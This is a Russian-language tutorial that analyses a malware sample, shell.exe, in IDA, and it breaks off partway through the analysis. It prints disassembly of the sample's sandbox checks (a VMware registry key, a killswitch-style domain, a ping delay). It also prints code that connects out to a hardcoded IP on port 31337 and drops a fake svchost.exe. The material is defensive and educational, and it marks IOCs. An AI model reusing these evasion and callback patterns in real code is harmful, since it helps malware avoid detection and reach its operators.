=====================================================================
* Code Analysis Example with IDA *
**********************************

Так как IDA является универсальным инструментов, то и осуществлять анализ кода вредоносного файла мы будем с ее использованием
В нашем примере название вредоносного исполняемого файла    -   shell.exe

Давайте продолжим анализ образца вредоносного ПО shell.exe
До этого момента мы обнаружили, что он проводит обнаружение в песочнице и что он включает возможный механизм сна — 5-секундную задержку пинга — перед выполнением своих предполагаемых операций.

    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    + Step 1. Importing a Malware Sample into the Disassembler - IDA +
    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    Для дальнейшего расследования мы должны тщательно изучить код в IDA, чтобы определить его дальнейшие действия и выяснить, как обойти проверку песочницы, используемую образцом вредоносного ПО.
    Мы можем запустить IDA, дважды щелкнув ярлык IDA или щелкнув его правой кнопкой мыши и выбрав "Запуск от имени администратора", чтобы обеспечить надлежащие права доступа.
    
        -   Сначала он отобразит информацию о лицензии, а затем предложит нам открыть новый исполняемый файл для анализа.

        -   Затем выбераем "New" и выберите образец shell.exe (из списка внизу)

        -   В диалоговом окне "Load a new file", мы можем выбрать архитектуру процессора.
            Выбераем нужную и нажмите OK.
            По умолчанию IDA определяет соответствующий тип процессора
        
        -   После того, как мы нажмем OK, IDA загрузит исполняемый файл в память и дизассемблирует машинный код, чтобы отобразить для нас дизассемблированный вывод.
            На экране вы увидите различные представления в IDA.
        
        -   После загрузки исполняемого файла и завершения анализа дизассемблированный код образца shell.exe будет представлен в главном окне IDA-View.
            Вы можете перемещаться по коду с помощью клавиш курсора или полосы прокрутки и увеличивать или уменьшать масштаб с помощью колеса мыши или элементов управления масштабированием.

    ++++++++++++++++++++++++++++++++
    + Step 2. Text and Graph Views +
    ++++++++++++++++++++++++++++++++

    *** Разобранный код представлен в двух режимах, а именно в графическом и текстовом представлении.
    
    Представление по умолчанию — графическое, которое обеспечивает графическую иллюстрацию основных блоков функции и их взаимосвязей.
    Основные блоки представляют собой последовательности инструкций с одной точкой входа и выхода.
    Эти основные блоки обозначены как узлы в графическом представлении, а соединения между ними — как ребра.

        -   Graph view
            Графическое представление предлагает графическое представление потока управления программы, облегчая лучшее понимание потока выполнения, идентификацию циклов, условных операторов и переходов
            А также визуализацию того, как программа разветвляется или циклически проходит через различные пути кода.
        
            Функции отображаются как узлы в графическом представлении.
            Каждая функция отображается как отдельный узел с уникальным идентификатором и дополнительными данными, такими как имя функции, адрес и размер.
        
        -   Text view
            Текстовое представление отображает инструкции по сборке вместе с соответствующими им адресами памяти.

                text:00000000004014F0 ; =============== S U B R O U T I N E =======================================
                text:00000000004014F0
                text:00000000004014F0
                text:00000000004014F0                 public start
                text:00000000004014F0 start           proc near               ; DATA XREF: .pdata:000000000040603C↓o
                text:00000000004014F0
                text:00000000004014F0 ; FUNCTION CHUNK AT 			.text:00000000004022A0 SIZE 000001B0 BYTES
                text:00000000004014F0
                text:00000000004014F0 ; __unwind { // __C_specific_handler
                text:00000000004014F0                 sub     rsp, 28h
                text:00000000004014F4
                text:00000000004014F4 loc_4014F4:                             ; DATA XREF: .xdata:0000000000407058↓o
                text:00000000004014F4 ;   __try { // __except at loc_40150C
                text:00000000004014F4                 mov     rax, cs:off_405850
                text:00000000004014FB                 mov     dword ptr [rax], 0
                text:0000000000401501                 call    sub_401650
                text:0000000000401506                 call    sub_401180
                text:000000000040150B                 nop
                text:000000000040150B ;   } // starts at 4014F4

            Каждая строка в текстовом представлении представляет собой инструкцию или элемент данных в коде, начиная с section name:virtual address format
            Например: .text:00000000004014F0, где
            
                    .text               -   имя раздела
                    00000000004014F0    -   виртуальный адрес
            
            Текстовый вид IDA использует стрелки для обозначения различных типов инструкций потока управления и переходов.
            Вот некоторые часто встречающиеся стрелки и их интерпретации:

                -   Solid Arrow (→)
                    Сплошная стрелка обозначает прямой переход или инструкцию ветвления, указывающую на безусловный сдвиг в потоке программы, где выполнение перемещается из одного места в другое.
                    Это происходит, когда встречается инструкция перехода или ветвления, такая как jmp или call.

                -   Dashed Arrow (---→)
                    Пунктирная стрелка представляет собой условный переход или инструкцию ветвления, предполагающую, что поток программы может измениться в зависимости от определенного условия.
                    Место назначения перехода зависит от результата условия.
                    Например, инструкция jz (перейти, если ноль) вызовет переход только в том случае, если предыдущее сравнение дало нулевое значение.
    
    По умолчанию IDA изначально отображает основную функцию или функцию в назначенной точке входа программы.
    Однако у нас есть свобода исследовать и изучать другие функции в графическом представлении.
    
    *** Для переключения между графическим и текстовым представлениями просто нажмите кнопку пробела

    ++++++++++++++++++++++++++++++++++++++++++++++++
    + Step 3. Recognizing the Main Function in IDA +
    ++++++++++++++++++++++++++++++++++++++++++++++++

    Следующий шаг демонстрирует функцию start, которая является точкой входа программы и обычно отвечает за настройку среды выполнения перед вызовом фактической функции main.
    Это начальная функция start, показанная IDA после загрузки исполняемого файла.

    Наша цель — найти фактическую main функцию, что требует дальнейшего изучения дизассемблирования.
    Мы будем искать function calls or jumps, которые ведут к другим функциям, поскольку одна из них, скорее всего, будет main функцией.
    Графическое представление IDA, перекрестные ссылки или список функций могут помочь в навигации по дизассемблированию и идентификации main функции.

    Однако, чтобы достичь main функции, нам сначала нужно понять устройство start функции.
    Эта функция в основном состоит из
    
        1)  Первый блок -   некий код инициализации

                public start
                start proc near

                ; FUNCTION CHUNK AT .text:00000000004022A0 SIZE 000001B0 BYTES

                ; __unwind { // __C_specific_handler
                sub     rsp, 28h
    
            Код начинается с вычитания 0x28 (40 в десятичной системе) из регистра rsp (указатель стека), эффективно создавая пространство в стеке для локальных переменных и сохраняя предыдущее содержимое стека.

                sub     rsp, 28h

        2)  Средний блок -   механизм обработки исключений и вызовов функций, который использует структурированную обработку исключений (SEH) в коде

                loc_4014F4:
                ;   __try { // __except at loc_40150C
                mov     rax, cs:off_405850
                mov     dword ptr [rax], 0
                call    sub_401650         ; Will inspect this function
                call    sub_401180         ; Will inspect this function
                nop
                ;   } // starts at 4014F4
            
            Тут ключевые слова __try и __except предполагают настройку блока обработки исключений.
            В нем последующие инструкции вызова вызывают две подпрограммы (функции) с именами sub_401650 и sub_401180 соответственно.
            Это имена-заполнители, автоматически сгенерированные IDA для обозначения подпрограмм, местоположений программ и данных.
            Автоматически сгенерированные имена обычно имеют один из следующих префиксов, за которыми следуют соответствующие им виртуальные адреса -   sub_<virtual_address> или loc_<virtual_address> и т. д.
        
        3)  Последний блок  -   обработчик исключений

                loc_40150C:
                ;   __except(TopLevelExceptionFilter) // owned by 4014F4
                nop
                add     rsp, 28h
                retn
                ; } // starts at 4014F0
                start endp
    
            В конечном итоге она переходит к метке loc_40150C, которая и является обработчиком исключений.
    
    *** В нашем случае мы можем сделать вывод, что это не фактическая основная функция, где обычно находится логика программы.

    +++++++++++++++++++++++++++++++++++++++++++++++
    + Step 4. Navigating Through Functions in IDA +
    +++++++++++++++++++++++++++++++++++++++++++++++

    Давайте проверим содержимое этих двух функций, перемещаясь внутри каждой функции и изучая дизассемблированный код

        -   call    sub_401650         ; Will inspect this function
        -   call    sub_401180         ; Will inspect this function
    
    Сначала мы откроем первую функцию/подпрограмму sub_401650.
    Чтобы ввести функцию в представлении дизассемблирования IDA:
    
        -   поместите курсор на инструкцию (sub_401650), представляющую вызов функции (или инструкцию перехода), которую мы хотим выполнить
        -   затем щелкните правой кнопкой мыши по инструкции
        -   и выберите «Jump to Operand» в контекстном меню.

    Либо мы можем нажать клавишу Enter на нашей клавиатуре.

    Затем IDA направит нас к целевому местоположению перехода или вызова функции, перенеся нас к началу вызываемой функции или месту назначения перехода.

        //////////////////
        /// sub_401650 ///
        //////////////////

        Теперь, когда мы находимся внутри первой функции/подпрограммы   -   sub_401650, давайте попытаемся понять ее, чтобы определить, является ли она основной функцией
        Если нет, мы пройдемся по другим функциям и распознаем вызов основной функции.

        В sub_401650 мы можем увидеть инструкции вызова для таких функций, как
        
            -   call    cs:GetSystemTimeAsFileTime,
            -   call    cs:GetCurrentProcessId,
            -   call    cs:GetCurrentThreadId,
            -   call    cs:GetTickCount
            -   call    cs:QueryPerformanceCounter.
        
        Этот шаблон часто наблюдается в начале дизассемблированного исполняемого кода и обычно состоит из настройки начального стекового кадра и выполнения некоторых задач инициализации, связанных с системой.

        Тип инструкций, описанных здесь, обычно встречается в исполняемом коде, создаваемом компиляторами, ориентированными на архитектуру x86/x64.
        Когда исполняемый файл загружается и запускается операционной системой, она должна подготовить среду выполнения для программы.
        Этот процесс включает такие задачи, как настройка стека, инициализация регистров и подготовка структур данных, относящихся к системе.

        В целом, этот раздел кода является частью начальной настройки среды выполнения, выполняя необходимые системные задачи инициализации перед выполнением основной логики программы.
        Цель здесь — гарантировать, что программа запускается в согласованном состоянии с доступом к необходимым системным ресурсам и информации.
        Для ясности, это не то место, где находится основная логика программы, и поэтому нам нужно исследовать другие вызовы функций, чтобы точно определить основную функцию.

    Давайте вернемся и откроем вторую подпрограмму, sub_401180, чтобы изучить ее содержимое.
    Чтобы вернуться к предыдущей функции, которую мы рассматривали, мы можем нажать клавишу Esc на клавиатуре или, в качестве альтернативы, нажать кнопку «Jump Back» на панели инструментов.
    IDA перенесет нас обратно к предыдущей функции, которую мы проверяли (loc_4014F4), перенеся нас туда, где мы были до перехода к текущей функции или местоположению.
    Теперь мы вернулись в предыдущее местоположении, которое содержит инструкции вызова текущей функции, sub_401650, а также другой функции, sub_401180.
    Отсюда мы можем установить курсор на инструкцию вызова sub_401180 и нажать Enter.

    Это приведет нас к функции sub_401180, где мы попытаемся определить основную функцию, в которой находится логика программы.

        //////////////////
        /// sub_401180 ///
        //////////////////

        При рассмотрении мы можем заметить, что эта функция, по-видимому, участвует в инициализации структуры StartupInfo и выполнении определенных проверок относительно ее значения.
        
        Инструкция rep stosq обнуляет блок памяти, в то время как последующие инструкции изменяют содержимое регистров и выполняют условные переходы на основе значений регистров.
        
        Это, по-видимому, не основная функция, в которой находится логика программы, но она содержит несколько инструкций вызова, которые потенциально могут привести нас к основной функции.
        Мы рассмотрим все инструкции вызова до возврата этой функции.

        Нам нужно прокрутить содержание данной фуекции вниз до конца и начать поиск инструкций вызова с самого низа.
        При прокрутке вверх от конечной точки этого блока (где функция возвращается) мы наблюдаем вызов другой подпрограммы     -   sub_403250, до возврата этой функции.

        Наша цель — пройти по вызовам функций, предшествующим выходу из программы, чтобы найти основную функцию, которая может содержать начальный код для проверки реестра (обнаружение песочницы), который мы наблюдали в мониторе процессов и строках.
        Теперь нам нужно перейти к функции sub_403250, чтобы исследовать ее содержимое.
        Чтобы войти в эту функцию, нам нужно установить курсор на инструкцию вызова и выберать «Jump to Operand» в контекстном меню
        Это действие покажет дизассемблированную функцию для sub_403250.

        //////////////////
        /// sub_403250 ///
        //////////////////

        При просмотре инструкций становится ясно, что функция запрашивает в реестре значение, связанное с путем SOFTWARE\\VMware, Inc.\\VMware Tools, и выполняет сравнение, чтобы определить, установлены ли на машине VMWare Tools.
        
            ...SNIP...
            xor     r8d, r8d                    ; ulOptions
            mov     [rsp+148h+cbData], 100h
            mov     [rsp+148h+phkResult], rax   ; phkResult
            mov     r9d, 20019h                 ; samDesired
            lea     rdx, aSoftwareVmware        ; "SOFTWARE\\VMware, Inc.\\VMware Tools"
            mov     rcx, 0FFFFFFFF80000002h     ; hKey
            call    cs:RegOpenKeyExA
            ...SNIP...
        
        В целом, кажется вероятным, что это основная функция, на которую ссылались в мониторе процесса и строках.

        Мы можем заметить, что в данном блоке кода последняя инструкция "call    cs:RegOpenKeyExA", предположительно, осуществляет запрос реестра, так как является представлением вызова функции RegOpenKeyExA
        
            call    cs:RegOpenKeyExA
        
        Функция RegOpenKeyExA является частью API реестра Windows и используется для открытия дескриптора указанного раздела реестра.
        Эта функция обеспечивает доступ к реестру Windows.
        "A" в имени функции означает, что это версия ANSI функции, которая работает со строками в кодировке ANSI.

        В IDA cs — это сегментный регистр, который обычно ссылается на сегмент кода.
        Когда мы выбираем cs:RegOpenKeyExA и нажимаем Enter, это действие переносит нас в раздел .idata, который включает данные, связанные с импортом, и адрес импорта функции RegOpenKeyExA.

            ...SNIP...
            .idata:0000000000409370 ; LSTATUS (__stdcall *RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
            .idata:0000000000409370                 extrn RegOpenKeyExA:qword
            .idata:0000000000409370                                         ; CODE XREF: sub_403160+3E↑p
            .idata:0000000000409370                                         ; sub_403220+3C↑p
            .idata:0000000000409370                                         ; DATA XREF: ...
            ...SNIP...

        В нашем примере функция RegOpenKeyExA импортируется из внешней библиотеки (advapi32.dll), а ее адрес сохраняется в разделе .idata для будущего использования.

            .idata:0000000000409370     -   Это не фактический адрес функции RegOpenKeyExA, а адрес записи в IAT (таблица адресов импорта) для RegOpenKeyExA.
                                            Запись IAT содержит адрес, который будет динамически разрешен во время выполнения, чтобы указать на фактическую реализацию функции в соответствующей DLL (в данном случае advapi32.dll).

            extrn RegOpenKeyExA:qword   -   данная строка указывает, что RegOpenKeyExA — это внешний символ, который должен быть разрешен во время выполнения.
                                            Это предупреждает ассемблер о том, что функция определена в другом модуле или библиотеке, и компоновщик будет обрабатывать разрешение ее адреса во время процесса компоновки.
        
        На самом деле cs:RegOpenKeyExA — это средство доступа к записи IAT для RegOpenKeyExA в сегменте кода с использованием относительной ссылки
        Фактический адрес RegOpenKeyExA будет разрешен и сохранен в IAT во время выполнения динамическим компоновщиком/загрузчиком операционной системы.

        Исходя из общей структуры этой функции, мы можем предположить, что это возможная основная функция.
        Давайте переименуем ее в proposed_Main для простоты запоминания в случае, если мы столкнемся со ссылками на эту функцию в будущем.

        Чтобы переименовать функцию в IDA, нужно выполнить следующие действия:

            i)  Поместите курсор на имя функции (sub_403250) или на строку, содержащую определение функции.
                Затем нажмите клавишу N на клавиатуре или щелкните правой кнопкой мыши и выберите «Rename» в контекстном меню.

            ii) Введите новое имя функции и нажмите Enter.

        IDA обновит имя функции во всем представлении дизассемблирования и во всех ссылках на функцию в двоичном файле.
        *** Переименование функции в IDA не изменяет сам двоичный файл.
            Оно изменяет только представление в анализе IDA.
        
        Продолжим углублятся в инструкции, представленные в этом блоке кода.
        Мы можем идентифицировать два вызова функций, исходящих из этой функци до вызова функции Windows API RegOpenKeyExA
        Давайте рассмотрим обе из них, прежде чем перейдем к функциям WINAPI

            A)  sub_401610
                В следующих инструкциях подробно описывается sub_401610.
                
                    sub_401610 proc near

                    mov     eax, cs:dword_408030
                    test    eax, eax
                    jz      short loc_401620 

                    loc_401620:
                    mov     cs:dword_408030, 1
                    jmp     sub_4015A0
                    sub_401610 endp
           
                    -   mov     eax, cs:dword_408030
                        Перейля в sub_401610, которая проверяет значение переменной
                        Он инициируется передачей (mov) значения переменной dword_408030 в регистр eax

                    -   test    eax, eax
                        Затем он выполняет побитовую операцию AND с eax и самим собой
                        По сути оценивая, равно ли значение нулю

                    -   mov     cs:dword_408030, 1
                        Если ее значение равно нулю, она переопределяется как единица

                    -   jmp     sub_4015A0
                        Затем она перенаправляется в sub_4015A0
                
                Давайте также разберем код sub_4015A0

                    sub_4015A0 proc near

                    push    rsi
                    push    rbx
                    sub     rsp, 28h
                    mov     rdx, cs:off_405730
                    mov     rax, [rdx]
                    mov     ecx, eax
                    cmp     eax, 0FFFFFFFFh
                    jz      short loc_4015F0
                
                    -   push    rsi
                        push    rbx
                        Как мы можем заметить, функция начинается с помещения значений регистров rsi и rbx в стек, сохраняя значения регистров.

                    -   sub     rsp, 28h
                        Затем она выделяет место в стеке, вычитая 28h (40 десятичных) байт из указателя стека (rsp).

                    -   mov     rdx, cs:off_405730
                        mov     rax, [rdx]
                        Далее она извлекает указатель функции из адреса, инкапсулированного в off_405730, и сохраняет его в регистре rax

                По сути, они, похоже, выполняют проверки инициализации и операции, связанные с указателями функций, прежде чем программа переходит к вызову второй подпрограммы sub_403110 и функции WINAPI для операций с реестром.
                Это не фактическая основная функция, размещающая логику программы, поэтому мы рассмотрим другие вызовы функций, чтобы точно определить основную функцию.

                Мы можем переименовать эту функцию в initCheck для нашей памяти, нажав N и введя новое имя функции.
                
                Теперь мы либо нажимаем клавишу Esc, либо выбираем кнопку Jump Back на панели инструментов, чтобы вернуться ко второй подпрограмме sub_403110 и изучить ее внутреннюю работу.
                После того, как мы перейдем обратно к предыдущей функции (assumed_Main), мы должны установить курсор на инструкцию вызова sub_403110 и нажать Enter.
            
            B)  sub_403110

                    sub_403110 proc near

                    lpDirectory= qword ptr -18h
                    nShowCmd= dword ptr -10h

                    sub     rsp, 38h
                    lea     r9, Parameters              ; "/k ping 127.0.0.1 -n 5"
                    lea     r8, File                    ; "C:\\Windows\\System32\\cmd.exe"
                    xor     ecx, ecx                    ; hwnd
                    lea     rdx, Operation              ; "open"
                    mov     [rsp+38h+nShowCmd], 0       ; nShowCmd
                    mov     [rsp+38h+lpDirectory], 0    ; lpDirectory
                    call    cs:ShellExecuteA
                    nop
                    add     rsp, 38h
                    retn
                    sub_403110 endp

                    -   lea     r9, Parameters  ; "/k ping 127.0.0.1 -n 5"
                        lea     r8, File        ; "C:\\Windows\\System32\\cmd.exe"
                        lea     rdx, Operation  ; "open"
                        Переменные Parameters, File и Operation являются строковыми переменными, размещенными в разделе .rdata исполняемого файла.
                        Инструкции lea используются для получения адресов памяти этих строк, которые впоследствии передаются в качестве аргументов функции ShellExecuteA.
                        Этот блок кода отвечает за длительность сна в 5 секунд.
                        После этого он возвращается к предыдущей функции.
                        Поняв код, мы можем переименовать эту функцию в pingSleep, щелкнув правой кнопкой мыши и выбрав переименовать.

        Теперь, когда мы столкнулись с некоторыми ссылками на функции Windows API, давайте выясним, как функции WINAPI интерпретируются в дизассемблированном коде.

        После исследования операций в двух вызовах функций (sub_401610 и sub_403110) из этой функции и перед вызовом функции Windows API RegOpenKeyExA, давайте проверим вызовы, сделанные для функции WINAPI RegOpenKeyExA.
        В этом представлении IDA аргументы, переданные вызову функции WINAPI, изображены над инструкцией вызова.
        Это стандартное соглашение в дизассемблах предлагает наглядное представление вызова функции вместе с соответствующими аргументами.

        Функция Windows API RegOpenKeyExA используется здесь для разблокировки раздела реестра.
        Синтаксис этой функции, согласно документации Microsoft, выглядит следующим образом

            LSTATUS RegOpenKeyExA(
                [in]           HKEY   hKey,
                [in, optional] LPCSTR lpSubKey,
                [in]           DWORD  ulOptions,
                [in]           REGSAM samDesired,
                [out]          PHKEY  phkResult
            );
        
        Давайте разберем код этой функции так, как он выглядит в разобранном виде IDA

            assumed_MAIN proc near

            ...SNIP...

            ...SNIP...
            lea     rax, [rsp+148h+hKey]        ; Calculate the address of hKey
            xor     r8d, r8d                    ; Clear r8d register (ulOptions)
            ...SNIP...
            mov     [rsp+148h+phkResult], rax   ; Store the calculated address of hKey in phkResult
            mov     r9d, 20019h                 ; Set samDesired to 0x20019h (which is KEY_READ in MS-DOCS)
            lea     rdx, aSoftwareVmware        ; Load address of string "SOFTWARE\\VMware, Inc.\\VMware Tools"
            mov     rcx, 0FFFFFFFF80000002h     ; Set hKey to 0xFFFFFFFF80000002h (HKEY_LOCAL_MACHINE)
            call    cs:RegOpenKeyExA            ; Call the RegOpenKeyExA function
            test    eax, eax                    ; Check the return value
            jnz     short loc_40330F            ; Jump if the return value is not zero (error condition)

            -   lea     rax, [rsp+148h+hKey]
                Инструкция lea вычисляет адрес переменной hKey, предположительно дескриптор раздела реестра
            
            -   mov     rcx, 0FFFFFFFF80000002h
                Затем mov rcx, 0FFFFFFFF80000002h помещает HKEY_LOCAL_MACHINE в качестве первого аргумента (rcx) в функцию.
            
            -   lea     rdx, aSoftwareVmware
                Инструкция lea rdx, aSoftwareVmware использует операцию загрузки эффективного адреса (LEA) для вычисления эффективного адреса ячейки памяти, в которой хранится строка Software\\VMware, Inc.\\VMware Tools.
                Этот вычисленный адрес затем помещается в регистр rdx, второй аргумент функции.

            -   xor     r8d, r8d
                Третий аргумент этой функции передается в регистр r8d через инструкцию xor r8d, r8d, которая очищает регистр r8d, реализуя операцию XOR с собой, фактически сбрасывая его в ноль.
                В контексте этого кода это указывает на то, что третий аргумент (ulOptions), переданный функции RegOpenKeyExA, имеет значение 0.

            -   mov     r9d, 20019h
                Четвертый аргумент — mov r9d, 20019h, что соответствует KEY_READ в MS-DOCS.

            -   mov     [rsp+148h+phkResult]
                Пятый аргумент, phkResult, находится в стеке.
                Добавляя rsp+148h к базовому указателю стека rsp, код получает доступ к ячейке памяти в стеке, где находится параметр phkResult.
                Инструкция mov [rsp+148h+phkResult], rax дублирует значение rax (которое содержит адрес hKey) в ячейку памяти, на которую указывает phkResult, по сути сохраняя адрес hKey в phkResult (который передается следующей функции как первый аргумент).

        С этого момента, всякий раз, когда мы натыкаемся на ссылку на функцию WINAPI в коде, мы будем обращаться к документации Microsoft для этой функции, чтобы понять ее синтаксис, параметры и возвращаемое значение.
        Это поможет нам понять вероятные значения в регистрах при вызове этих функций.

        Если мы прокрутим вниз графическое представление, мы столкнемся со следующей функцией WINAPI RegQueryValueExA, которая извлекает тип и данные для указанного имени значения, связанного с открытым разделом реестра.
        Данные ключа сравниваются, и при совпадении отображается окно сообщения Sandbox Detected.
        Если они не совпадают, то он перенаправляется в другую подпрограмму sub_402EA0.
        Мы исправим это обнаружение sandbox в отладчике позже..

        Давайте нажмем Enter на предстоящей инструкции вызова функции sub_402EA0, чтобы иметь возможность тщательно изучить эту подпрограмму и разобраться в ее работе.

        //////////////////
        /// sub_402EA0 ///
        //////////////////

            sub_402EA0 proc near

            ppResult= qword ptr -1E8h
            pHints= ADDRINFOA ptr -1E0h
            WSAData= WSAData ptr -1B0h

            push    rdi
            push    rbx
            sub     rsp, 1F8h
            mov     ecx, 202h                                       ; wVersionRequested
            lea     rdx, [rsp+208h+WSAData]                         ; lpWSAData
            call    cs:WSAStartup
            lea     r8, [rsp+208h+pHints]                           ; pHints
            xor     eax, eax
            xor     edx, edx                                        ; pServiceName
            mov     rdi, r8
            mov     ecx, 0Ch
            lea     r9, [rsp+208h+ppResult]                         ; ppResult
            mov     [rsp+208h+ppResult], 0
            rep stosd
            mov     eax, 1
            lea     rcx, pNodeName                                  ; "iuqerfsodp9ifjaposdfjhgosurijfaewrwergw"...
            shl     rax, 20h
            mov     qword ptr [rsp+208h+pHints.ai_family], rax
            call    cs:getaddrinfo
            mov     rbx, cs:WSACleanup
            test    eax, eax
            jz      short loc_402F09
        
        После нажатия Enter мы раскрываем его функциональность.
        Эта подпрограмма, похоже, выполняет сетевые операции с использованием API сокетов Windows (Winsock).
        Сначала она вызывает функцию WSAStartup для настройки библиотеки Winsock
        Затем вызывает функцию WSAAPI getaddrinfo, которая используется для извлечения адресной информации для указанного имени узла (pNodeName) на основе предоставленных подсказок pHints.
        Подпрограмма проверяет успешность разрешения адреса с помощью функции getaddrinfo.

        Если функция getaddrinfo возвращает нулевое возвращаемое значение (указывающее на успех), это означает, что адрес был успешно разрешен в IP.
        После этого события, если это действительно удалось, последовательность переходит к MessageBox, который отображает Sandbox found.
        Если нет, она направляет поток к подпрограмме sub_402D00.

        Затем она предлагает вызвать функцию WSACleanup.
        Это действие инициирует очистку ресурсов, связанных с Winsock, независимо от того, был ли процесс разрешения адреса успешным или нет.
        Для ясности мы назовем эту функцию DomainSandboxCheck.

        *** Возможный IOC
            Пожалуйста, обратите внимание на доменное имя iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com как на компонент потенциальных IOC.

        Чтобы изучить последствия обхода проверки песочницы, мы углубимся в подпрограмму sub_402D00.
        Мы можем изучить эту подпрограмму, нажав Enter на последующей инструкции вызова, связанной с функцией sub_402D00.

        //////////////////
        /// sub_402D00 ///
        //////////////////

            sub_402D00 proc near
            sub     rsp, 28h
            call    sub_402C20
            test    eax, eax
            jz      short loc_402D16
        
        Эта функция сначала резервирует место в стеке для локальных переменных перед вызовом sub_402C20, отдельной функции.
        
        Затем вывод этой функции сохраняется в регистре eax.
        В зависимости от результатов, полученных от функции sub_402C20, последовательность либо возвращается (retn), либо переходит к sub_402D20.

        Следовательно, мы выберем первую выделенную функцию, sub_402C20, нажав Enter, чтобы изучить ее инструкции.
        После тщательного анализа sub_402C20 мы вернемся к этому блоку, чтобы оценить вторую выделенную функцию, sub_402D20, которая вложена в строку   -   jz      short loc_402D16

        //////////////////
        /// sub_402C20 ///
        //////////////////

        После нажатия Enter нас встречают следующие инструкции
        
            sub_402C20 proc near

            name= sockaddr ptr -1C0h
            WSAData= WSAData ptr -1B0h

            push    r12
            push    rdi
            sub     rsp, 1D8h
            xor     eax, eax
            mov     ecx, 66h ; 'f'
            lea     rdi, [rsp+1E8h+WSAData]
            lea     rdx, [rsp+1E8h+WSAData]                         ; lpWSAData
            rep stosd
            mov     ecx, 202h                                       ; wVersionRequested
            call    cs:WSAStartup
            mov     r8d, 6                                          ; protocol
            mov     edx, 1                                          ; type
            mov     ecx, 2                                          ; af
            mov     qword ptr [rsp+1E8h+name.sa_family], 0
            mov     qword ptr [rsp+1E8h+name.sa_data+6], 0
            call    cs:socket
            lea     rcx, cp                                         ; "45.33.32.156"
            mov     [rsp+1E8h+name.sa_family], 2
            mov     r12, rax
            call    cs:inet_addr
            mov     ecx, 7A69h                                      ; hostshort
            mov     dword ptr [rsp+1E8h+name.sa_data+2], eax
            call    cs:htons
            lea     rdx, [rsp+1E8h+name]                            ; name
            mov     r8d, 10h                                        ; namelen
            mov     rcx, r12                                        ; s
            mov     word ptr [rsp+1E8h+name.sa_data], ax
            call    cs:connect
            inc     eax
            jnz     short loc_402CD0

        Эта функция инициирует библиотеку Winsock, генерирует сокет и подключается к IP-адресу 45.33.32.156 через порт 31337.
        Она оценивает возвращаемое значение (eax), чтобы убедиться, что соединение было успешным.
        При этом инструкция -   lea     rcx, cp         ; "45.33.32.156" относиться к IP адресу
        А для назначения порта используется следующий набор инструкций  -   mov     ecx, 7A69h      ; hostshort
                                                                            mov     dword ptr [rsp+1E8h+name.sa_data+2], eax
                                                                            call    cs:htons
        Где в инструкции    -   mov     ecx, 7A69h      ; hostshort    оператор загружает в ecx значение 0x7A69, после чего вызывается htons, который переводит его в сетевой порядок байтов
        А инструкции        -   call    cs:htons
                                mov     word ptr [rsp+1E8h+name.sa_data], ax
                Функция htons (host-to-network short) конвертирует 16-битное значение из хостового порядка в сетевой (big-endian), а затем результат записывается в name.sa_data (именно в поле, которое хранит номер порта в sockaddr).
                Таким образом, порт перед подключением будет 0x7A69, что в десятичной системе равно 31337.

        Однако есть нюанс   -   после вызова функции инструкция inc eax увеличивает значение регистра eax на 1.
        После инструкции inc eax код оценивает значение eax с помощью инструкции jnz (перейти, если не ноль).

        Если подключение к вышеупомянутому порту и IP-адресу не удалось, эта функция должна вернуть -1, как указано в документации.
        Учитывая, что eax увеличивается на 1 после вызова функции, это должно уменьшиться до 0.
        Следовательно, MessageBox выведет Sandbox detected.
        Это означает, что функция проверяет состояние интернет-соединения.

        Если же соединение успешно, оно выдаст ненулевое значение, побуждая код перейти к loc_402CD0.
        В этом месте находится вызов другой функции, sub_402F40.
        Имея четкое представление о работе этой функции, мы переименуем ее в InternetSandboxCheck.

        *** Возможный IOC
            Не забудьте отметить этот IP-адрес 45.33.32.156 и порт 31337 как компоненты потенциальных IOC.

        Далее мы перейдем к функции sub_402F40, чтобы расшифровать ее операции.
        Мы можем сделать это, щелкнув правой кнопкой мыши и выбрав Jump to Operand, или нажав Enter на ее инструкции вызова

        //////////////////
        /// sub_402F40 ///
        //////////////////

            ssub_402F40 proc near

            dwFlags= dword ptr -788h
            dwContext= qword ptr -780h
            hTemplateFile= qword ptr -778h
            lpBuffer= qword ptr -760h
            dwNumberOfBytesRead= dword ptr -74Ch
            nSize= dword ptr -748h
            NumberOfBytesWritten= dword ptr -744h
            Buffer= byte ptr -740h
            var_640= byte ptr -640h
            szAgent= byte ptr -53Ch
            var_438= byte ptr -438h

            push    r15
            push    r14
            push    r13
            push    r12
            push    rsi
            push    rbx
            sub     rsp, 778h
            lea     rcx, VarName                ; "TEMP"
            call    getenv
            lea     r15, [rsp+7A8h+Buffer]
            lea     r9, aSvchostExe             ; "svchost.exe"
            mov     r8, rax
            lea     rdx, aSS                    ; "%s\\%s"
            mov     rcx, r15                    ; Buffer
            call    sprintf
            lea     r9, [rsp+7A8h+var_640]
            lea     rdx, [rsp+7A8h+nSize]       ; nSize
            mov     [rsp+7A8h+nSize], 104h
            mov     [rsp+7A8h+lpBuffer], r9
            mov     rcx, r9                     ; lpBuffer
            call    cs:GetComputerNameA
            mov     r9, [rsp+7A8h+lpBuffer]
            test    eax, eax
            jz      loc_4030F8
        
        Эта функция вызывает функцию getenv (где rcx выступает в качестве передающего аргумента для TEMP) и сохраняет ее результат в регистре eax.
        Это действие извлекает значение переменной среды TEMP.

        Чтобы проверить вывод, мы можем использовать PowerShell для вывода значения переменной среды TEMP.

            PS C:\> Get-ChildItem env:TEMP
        
        Затем он использует функцию sprintf для добавления полученного пути TEMP к строке svchost.exe, что дает полный путь к файлу.
        
        После этого вызывается функция (call    cs:GetComputerNameA) для извлечения имени компьютера, которое затем сохраняется в буфере (mov     r9, [rsp+7A8h+lpBuffer]).
        Если имя компьютера не существует, он переходит к метке loc_4030F8 (где находятся инструкции для возврата).
        И наоборот, если имя компьютера не пустое (ненулевое значение), код переходит к следующей инструкции

            lea     r12, [rsp+7A8h+szAgent]
            lea     r8, aWindowsUpdate7                 ; "Windows-Update/7.6.7600.256 %s"
            mov     edx, 104h
            mov     rcx, r12
            call    sub_403220
            mov     rcx, r12                            ; lpszAgent
            xor     r9d, r9d                            ; lpszProxyBypass
            xor     r8d, r8d                            ; lpszProxy
            mov     edx, 1                              ; dwAccessType
            mov     [rsp+7A8h+dwFlags], 0               ; dwFlags
            call    cs:InternetOpenA
